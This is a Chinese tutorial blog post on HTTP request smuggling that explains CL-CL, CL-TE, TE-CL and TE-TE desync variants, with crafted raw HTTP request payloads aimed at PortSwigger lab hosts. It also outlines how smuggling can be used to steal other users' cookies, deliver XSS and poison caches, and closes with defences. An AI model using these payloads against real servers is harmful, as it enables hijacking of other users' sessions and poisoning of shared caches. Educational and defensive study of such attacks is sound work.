---
layout: post
title:  web 安全系列-19-HTTP Desync Attacks HTTP请求走私
date:  2020-08-09 10:37:20 +0800
categories: [web]
tags: [web, web-safe, sf]
published: true
---

# 发展时间线

最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。

通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。

https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf

在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。

https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf

在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。

https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153

# 产生原因

HTTP请求走私这一攻击方式很特殊，它不像其他的Web攻击方式那样比较直观，它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。

这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。

## HTTP 1.1 协议

在进行后续的学习研究前，我们先来认识一下如今使用最为广泛的HTTP 1.1的协议特性——Keep-Alive&Pipeline。

在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。

于是在HTTP1.1中，增加了Keep-Alive和Pipeline这两个特性。

所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。

有了Keep-Alive之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。

现如今，浏览器默认是不启用Pipeline的，但是一般的服务器都提供了对Pipleline的支持。

为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。

这就有了一个很典型的拓扑结构。

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/210339_17595f87_508704.png)

一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。

这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。

**当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。**


## CL不为0的GET请求

其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。

在RFC2616中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的RFC7231的4.3.1节中也仅仅提了一句。

https://tools.ietf.org/html/rfc7231#section-4.3.1

> sending a payload body on a GET request might cause some existing implementations to reject the request

假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 `Content-Length` 头，不进行处理。

这就有可能导致请求走私。

比如我们构造请求

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET / secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

前端服务器收到该请求，通过读取Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，它就认为这是收到了两个请求，分别是

```
第一个
GET / HTTP/1.1\r\n
Host: example.com\r\n

第二个
GET / secret HTTP/1.1\r\n
Host: example.com\r\n
```

这就导致了请求走私。在本文后续有一个类似于这一攻击方式的实例，推荐结合起来看下。

## CL-CL

在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。

https://tools.ietf.org/html/rfc7230#section-3.3.3

但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。

此时恶意攻击者可以构造一个特殊的请求

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```

中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。

当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。

而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。

此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。

```
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
```

从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。

这时候正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是

```
aGET /index.html HTTP/1.1\r\n
Host: example.com\r\n
```

这时候用户就会收到一个类似于aGET request method not found的报错。

这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。

但是两个Content-Length这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。

但是在RFC2616的第4.4节中，规定:如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。

服务器在这里的实现更容易出问题。

> https://tools.ietf.org/html/rfc2616#section-4.4

## CL-TE

所谓CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding这一请求头。

chunk传输数据格式如下，其中size的值由16进制表示。

```
[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
```

Lab 地址：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

构造数据包

```
POST / HTTP/1.1\r\n
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G
```

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/211156_ebf9221b_508704.png)

由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是

```
0\r\n
\r\n
G
```

当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到0\r\n\r\n时，认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。

当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。


```
GPOST / HTTP/1.1\r\n
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
......
```

服务器在解析时当然会产生报错了。

## TE-CL

所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。

Lab地址：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

构造数据包

```
POST / HTTP/1.1\r\n
Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/211319_37024685_508704.png)

由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是

```
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

成功报错。

## TE-TE

TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，这确实是实现了RFC的标准。

不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，从而使其中一个服务器不处理Transfer-Encoding请求头。

从某种意义上还是CL-TE或者TE-CL

Lab地址：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header

构造数据包

```
POST / HTTP/1.1\r\n
Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/211456_90c4028e_508704.png)


# 攻击实例

## 绕过前端服务器的安全控制

在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。

因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。

在这里有两个实验，分别是使用CL-TE和TE-CL绕过前端的访问控制。

- 使用CL-TE绕过前端服务器安全控制

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

- 使用TE-CL绕过前端服务器安全控制

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

## 获取前端服务器重写请求字段

在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。

这些字段是后端服务器对请求进行处理所必须的，比如：

- 描述TLS连接所使用的协议和密码

- 包含用户IP地址的XFF头

- 用户的会话令牌ID

总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。

那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：

1. 找一个能够将请求参数的值输出到响应中的POST请求

2. 把该POST请求中，找到的这个特殊的参数放在消息的最后面

3. 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。

怎么理解呢，还是做一下实验来一起来学习下吧。

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

## 获取其他用户的请求

在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。

换句话说，我们通过请求走私获取到了我们走私请求之后的请求。

如果在我们的恶意请求之后，其他用户也进行了请求呢？

我们寻找的这个POST请求会将获得的数据存储并展示出来呢？

这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。

这可以用来偷取用户的敏感信息，比如账号密码等信息。

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

实验的最终目的是获取其他用户的Cookie用来访问其他账号。

## 利用反射型XSS

我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1)

## 进行缓存投毒

一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

实验环境中提供了漏洞利用的辅助服务器。

# 如何防御

从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？

不针对特定的服务器，通用的防御措施大概有三种。

（1）禁用代理服务器与后端服务器之间的TCP连接重用。

（2）使用HTTP/2协议。

（3）前后端使用相同的服务器。

以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。

使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。

从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。

# 拓展阅读  

[web 安全系列](https://houbb.github.io/2020/08/09/web-safe-00-overview)

# 参考资料

[协议层的攻击——HTTP请求走私](https://paper.seebug.org/1048/)

[HTTP 请求走私](https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html)

* any list
{:toc}